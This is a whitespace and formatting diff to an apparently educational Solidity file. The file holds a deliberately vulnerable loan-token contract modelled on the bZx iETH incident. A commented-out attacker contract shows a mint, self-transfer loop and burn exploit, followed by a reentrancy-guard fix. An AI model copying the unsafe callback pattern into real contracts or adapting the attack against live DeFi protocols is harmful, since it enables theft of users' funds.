@@ -30,29 +30,32 @@ pragma solidity ^0.8.0;
 
 interface IERC20 {
     function transfer(address to, uint256 amount) external returns (bool);
+
     function balanceOf(address account) external view returns (uint256);
 }
 
 contract VulnerableBZXLoanToken {
     string public name = "iETH";
     string public symbol = "iETH";
-    
+
     mapping(address => uint256) public balances;
     uint256 public totalSupply;
     uint256 public totalAssetBorrow;
     uint256 public totalAssetSupply;
-    
+
     /**
      * @notice Mint loan tokens by depositing ETH
      */
-    function mintWithEther(address receiver) external payable returns (uint256 mintAmount) {
+    function mintWithEther(
+        address receiver
+    ) external payable returns (uint256 mintAmount) {
         uint256 currentPrice = _tokenPrice();
         mintAmount = (msg.value * 1e18) / currentPrice;
-        
+
         balances[receiver] += mintAmount;
         totalSupply += mintAmount;
         totalAssetSupply += msg.value;
-        
+
         return mintAmount;
     }
 
@@ -78,12 +81,12 @@ contract VulnerableBZXLoanToken {
      */
     function transfer(address to, uint256 amount) external returns (bool) {
         require(balances[msg.sender] >= amount, "Insufficient balance");
-        
+
         balances[msg.sender] -= amount;
         balances[to] += amount;
-        
+
         _notifyTransfer(msg.sender, to, amount);
-        
+
         return true;
     }
 
@@ -91,10 +94,14 @@ contract VulnerableBZXLoanToken {
      * @notice Internal function that triggers callback
      * @dev This is where the reentrancy/callback happens
      */
-    function _notifyTransfer(address from, address to, uint256 amount) internal {
+    function _notifyTransfer(
+        address from,
+        address to,
+        uint256 amount
+    ) internal {
         // If 'to' is a contract, it might have a callback
         // During this callback, contract state is inconsistent
-        
+
         // Simulate callback by calling a function on recipient if it's a contract
         if (_isContract(to)) {
             // This would trigger fallback/receive on recipient
@@ -107,18 +114,21 @@ contract VulnerableBZXLoanToken {
     /**
      * @notice Burn tokens back to ETH
      */
-    function burnToEther(address receiver, uint256 amount) external returns (uint256 ethAmount) {
+    function burnToEther(
+        address receiver,
+        uint256 amount
+    ) external returns (uint256 ethAmount) {
         require(balances[msg.sender] >= amount, "Insufficient balance");
-        
+
         uint256 currentPrice = _tokenPrice();
         ethAmount = (amount * currentPrice) / 1e18;
-        
+
         balances[msg.sender] -= amount;
         totalSupply -= amount;
         totalAssetSupply -= ethAmount;
-        
+
         payable(receiver).transfer(ethAmount);
-        
+
         return ethAmount;
     }
 
@@ -157,27 +167,27 @@ contract VulnerableBZXLoanToken {
  * contract BZXAttacker {
  *     VulnerableBZXLoanToken public loanToken;
  *     uint256 public transferCount;
- *     
+ *
  *     constructor(address _loanToken) {
  *         loanToken = VulnerableBZXLoanToken(_loanToken);
  *     }
- *     
+ *
  *     function attack() external payable {
  *         // Step 1: Mint loan tokens with ETH
  *         loanToken.mintWithEther{value: msg.value}(address(this));
- *         
+ *
  *         // Step 2: Transfer to self repeatedly
  *         // Each transfer triggers fallback, creating state inconsistency
  *         for (uint i = 0; i < 4; i++) {
  *             uint256 balance = loanToken.balanceOf(address(this));
  *             loanToken.transfer(address(this), balance);
  *         }
- *         
+ *
  *         // Step 3: Burn inflated tokens back to ETH
  *         uint256 finalBalance = loanToken.balanceOf(address(this));
  *         loanToken.burnToEther(address(this), finalBalance);
  *     }
- *     
+ *
  *     // Fallback is triggered during transfer
  *     fallback() external payable {
  *         // State is inconsistent here
@@ -195,7 +205,7 @@ contract VulnerableBZXLoanToken {
  * Use reentrancy guards on transfer:
  *
  * bool private locked;
- * 
+ *
  * modifier nonReentrant() {
  *     require(!locked, "No reentrancy");
  *     locked = true;
